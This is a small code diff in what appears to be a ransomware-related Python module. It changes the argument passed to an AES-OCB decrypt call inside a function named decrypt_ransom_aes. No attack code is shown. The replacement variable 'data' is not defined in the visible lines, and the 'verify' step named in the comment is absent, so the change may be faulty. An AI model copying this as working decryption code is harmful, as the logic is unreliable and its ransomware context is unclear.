@@ -251,7 +251,7 @@ def decrypt_ransom_aes(ciphertext, key, padding=chr(0)):
         cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB, nonce=nonce)
         
         # Decrypt and verify the ciphertext
-        plaintext = cipher.decrypt(ciphertext)
+        plaintext = cipher.decrypt(data)
 
     except Exception as e:
         log("{} error: {}".format(decrypt_ransom_aes.__name__, str(e)))
